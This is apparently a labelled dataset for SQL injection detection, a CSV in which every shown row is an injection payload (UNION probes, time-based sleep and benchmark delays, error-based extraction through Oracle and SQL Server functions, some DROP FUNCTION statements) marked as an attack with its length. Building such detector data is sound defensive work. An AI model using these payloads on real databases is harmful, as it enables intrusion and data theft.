sentence,attack_type,len_payload
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( 'pWYG' LIKE 'pWYG",1,341
' AND 4301 =  ( SELECT 4301 FROM PG_SLEEP ( 5  )  )  -- AND 'IaaC' LIKE 'IaaC,1,77
"-6145'+ ( select nnjn where 1389 = 1389 union all select 1389,1389,1389--",1,73
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,151
"1'  )  )   as clhk where 4607 = 4607 or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1,250
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",1,64
"1""  )  )   as iqgd where 7611 = 7611 union all select null,null,null,null,null#",1,79
"1""  )  )   or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  ""lide"" = ""lide",1,152
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( 'GXEv' LIKE 'GXEv",1,101
"  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  9686 = 9686",1,299
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'CJyJ' LIKE 'CJyJ",1,320
 ) ; IF ( 3126 = 36 )  SELECT 3126 ELSE DROP FUNCTION tTTP;--,1,60
1'  )  )   as cpwx where 5378 = 5378 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1,100
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND 'HmPk' = 'HmPk",1,331
select pg_sleep ( 5 )  and   (  (  'vxxg' = 'vxxg,1,49
' union all select @@version--,1,30
"1"" )  as jmwr where 5978 = 5978 rlike  ( select  ( case when  ( 1396 = 8762 )  then 1 else 0x28 end  )  )  --",1,109
"1"" where 1618 = 1618 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,96
1'|| ( select 'ymre' where 8681 = 8681,1,38
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#",1,205
"1 )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ",1,275
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL# AND   (  (   ( ""tHYO"" = ""tHYO",1,77
"1, ( select  ( case when  ( 9443 = 9443 )  then sleep ( 5 )  else 9443* ( select 9443 from information_schema.character_sets )  end  )  )  ",1,137
"'+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL ) ,NULL )  --",1,66
"1%'  )  )   union all select null,null,null,null#",1,49
1' )  as kqbh where 6138 = 6138,1,31
"1""  )  )   )  and make_set ( 8403 = 8403,8899 )  and   (  (   ( ""czvm"" like ""czvm",1,81
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- AND ""QTVP"" = ""QTVP",1,74
 select * from users where id = '1' or \.<\ or 1 = 1 -- 1',1,57
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  'KbqI' = 'KbqI",1,300
"  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  8450 = 8450",1,179
"snc: select * from users where id = 1 or ""$#"" or 1 = 1 -- 1",1,59
"-8521' )  union all select 2446,2446,2446,2446,2446,2446,2446#",1,62
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 747 = 747",1,186
""") or benchmark(10000000,MD5(1))#",1,33
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND 'VJhB' LIKE 'VJhB",1,202
1  )  )   )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( 3505 = 3505,1,302
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  ""AXnh"" LIKE ""AXnh",1,177
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( ""HEwG"" = ""HEwG",1,80
1'  )  )   or sleep ( 5 ) #,1,27
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND 'qVNj' LIKE 'qVNj",1,304
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  'VYWZ' = 'VYWZ",1,149
"  )  )   )  AND 7194 = CTXSYS.DRITHSX.SN ( 7194, ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7194 = 7194 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   )  AND   (  (   ( 6261 = 6261",1,293
select  ( case when  ( 2716 = 8138 )  then 2716 else 2716* ( select 2716 from mysql.db )  end ) #,1,97
" UNION SELECT @@VERSION,SLEEP ( 5 ) ,""'3'""#",1,42
"1 and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  -- zozj",1,83
&oo1&: select * from users where id = 1 or \<  = 1 or 1 = 1 -- 1,1,64
"1"" )  and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,114
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and   (  (  ""vfvh"" = ""vfvh",1,128
 select sleep ( 5 )  and   (  (  8679 = 8679,1,43
"'  )  )   )  UNION ALL SELECT NULL, NULL-- AND   (  (   ( 'RHnQ' LIKE 'RHnQ",1,75
-6109 union all select 6784--,1,29
1 )  as mtnw where 7293 = 7293 and 2603 = 5764--,1,48
"1' )  as wnys where 6457 = 6457 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1,87
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  ""WMsZ"" LIKE ""WMsZ",1,320
"1"" where 2619 = 2619 and 2823 = 5100#",1,37
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  'vIVJ' LIKE 'vIVJ",1,141
-5449' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( ,1,254
-8963 )  where 8528 = 8528 or  ( 2470 = 3271 ) *3271--,1,54
"1"" )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and  ( ""azpb"" = ""azpb",1,142
"1 )  as svkf where 6503 = 6503 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,214
"-5275%'  )  )   union all select 9382,9382,9382,9382,9382,9382,9382,9382,9382,9382--",1,84
-6233' )  where 9820 = 9820 or 3038 = 3038,1,42
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND ""jqty"" LIKE ""jqty",1,215
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  ""RIrV"" LIKE ""RIrV",1,254
"1%"" )  and 2006 = 2006",1,22
"'  )  )   AND 8214 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 98 ) ||CHR ( 105 ) ||CHR ( 106 ) ||CHR ( 71 ) ,5 ) -- AND   (  (  'dDdL' LIKE 'dDdL",1,138
"1""  )  )   and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1,64
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND ""yTZm"" = ""yTZm",1,163
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'yccm' LIKE 'yccm",1,296
"1"" and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and ""zwov"" = ""zwov",1,96
"soovU: select * from users where id = '1' %!<@ union select 1,version (  )  -- 1'",1,81
"1 )  as hywx where 1424 = 1424 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,136
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND 'ZPXs' LIKE 'ZPXs",1,154
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#",1,291
1 )  order by 1#,1,16
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'PmEW' LIKE 'PmEW",1,314
1%'  )  )   )  and 4595 = 4595#,1,31
"1'  )  )   and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  'igqm' = 'igqm",1,250
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND 'nkVN' = 'nkVN",1,175
"1'  )  )   as lizu where 7691 = 7691 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,220
"' UNION ALL SELECT NULL, NULL, NULL, NULL# AND 'nhtI' = 'nhtI",1,61
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  ""AYGw"" = ""AYGw",1,191
"""  )  )   ) ; IF ( 8282 = 5111 )  SELECT 8282 ELSE DROP FUNCTION YtxL;-- AND   (  (   ( ""zkCo"" LIKE ""zkCo",1,105
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 6956 = 6956",1,293
" select * from users where id = 1 or "";["" or 1 = 1 -- 1",1,54
"1'  )  )   as hfra where 6500 = 6500 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,145
"1%"" or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,165
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- ",1,48
"1 where 3478 = 3478  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   ) --",1,287
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1,188
" select * from users where id = 1 <@1$ union select 1,version (  )  -- 1",1,71
"1 )  as cfnz where 6065 = 6065 union all select null,null,null,null,null,null,null,null,null#",1,93
"1"" )  as upjw where 3880 = 3880 and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,140
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'oBeE' = 'oBeE",1,101
"os: select * from users where id = 1 <@$$ union select 1,version (  )  -- 1",1,75
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND ""jrwW"" = ""jrwW",1,158
"""  )  )   )  AND 942 = CONVERT ( INT, ( CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 942 = 942 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( ""YSXi"" = ""YSXi",1,299
select  ( case when  ( 4636 = 1108 )  then 1 else 4636* ( select 4636 from master..sysdatabases )  end ) --,1,107
"1 )  and elt ( 3138 = 1817,1817 ) ",1,33
" ) ,NULL )  waitfor delay '0:0:20' --",1,36
-6100' )  as kvfc where 2377 = 2377 or 6872 = 6872--,1,52
"""  )  )   )  WAITFOR DELAY '0:0:5'-- AND   (  (   ( ""krJV"" LIKE ""krJV",1,69
"-4085'+ ( select aipn where 5493 = 5493 union all select 5493,5493,5493,5493,5493,5493,5493#",1,92
"  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  8338 = 8338",1,108
"1%""  )  )   )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( ""%"" = """,1,112
"1 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )  # igen",1,63
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- AND ""Ktda"" LIKE ""Ktda",1,77
-1252' )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ,1,254
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL# AND   (  (  ""uTSG"" = ""uTSG",1,83
"1'|| ( select 'gopc' where 7386 = 7386 and make_set ( 9375 = 7963,7963  )  )  ||'",1,81
"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) # tsxs",1,103
" select * from users where id = 1 -@<@ union select 1,version (  )  -- 1",1,71
"-3637"" or  ( 8459 = 8459 ) *4906",1,32
"1"" )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( ""ikaf"" like ""ikaf",1,113
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( ""AKQu"" LIKE ""AKQu",1,304
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND ""TFpX"" = ""TFpX",1,259
"-1055' union all select 7758,7758,7758,7758,7758,7758--",1,55
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 6741 = 6741",1,132
"1%'  )  )   )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( '%' = '",1,112
""" ) ; BEGIN USER_LOCK.SLEEP ( 5 ) ; END;-- AND  ( ""BfeF"" LIKE ""BfeF",1,67
"s ( :s: select * from users where id = 1 or "" ( :"" or 1 = 1 -- 1",1,64
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( ""FlWS"" = ""FlWS",1,234
"-3587' )  or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr (",1,255
" select * from users where id = 1 + @`\` union select 1,version (  )  -- 1",1,73
"  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  4591 = 4591",1,329
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  'nKCk' LIKE 'nKCk",1,237
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( ""JJdQ"" LIKE ""JJdQ",1,125
1 or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,1,62
"-9496  )  )   )  or elt ( 7511 = 3951,3951 )  and   (  (   ( 3514 = 3514",1,72
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 'vfdQ' = 'vfdQ",1,319
"1' )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and  ( 'cqrp' = 'cqrp",1,133
-6661'  )  )   or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char (,1,255
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 7050 = 7050",1,113
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  'hHvV' LIKE 'hHvV",1,273
"1'  )  )   )  or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,97
"1' and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,144
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 'oQjT' LIKE 'oQjT",1,226
"1""  )  )   )  waitfor delay '0:0:5' and   (  (   ( ""tuhy"" like ""tuhy",1,68
"""  )  )   ) ; SELECT PG_SLEEP ( 5 ) ;-- AND   (  (   ( ""MPvC"" = ""MPvC",1,69
  )  )  ; BEGIN DBMS_LOCK.SLEEP ( 5 ) ; END;-- AND   (  (  4510 = 4510,1,68
" select * from users where id = '1' + $+*$ union select 1,@@VERSION -- 1'",1,72
"1'+ ( select 'ewlk' where 1078 = 1078 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,200
"-2276""  )  )   as qwow where 2321 = 2321 or 3534 = 2971--",1,57
 ( SELECT  ( CASE WHEN  ( 9546 = 6041 )  THEN 77B4A14B9E00AF083BA8806DA94B1348 ELSE 1/ ( SELECT 0 FROM DUAL )  END )  FROM DUAL ) ,1,128
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",1,91
"1"" and sleep ( 5 ) ",1,18
"-6381%""  )  )   )  union all select 1503,1503,1503,1503#",1,56
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( ""TdDu"" = ""TdDu",1,272
-8010' or  ( 2225 = 8491 ) *8491 and 'eipf' = 'eipf,1,51
"' and 0 = benchmark ( 3000000,MD5 ( 1  )  )   --",1,48
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND ""aIpg"" = ""aIpg",1,175
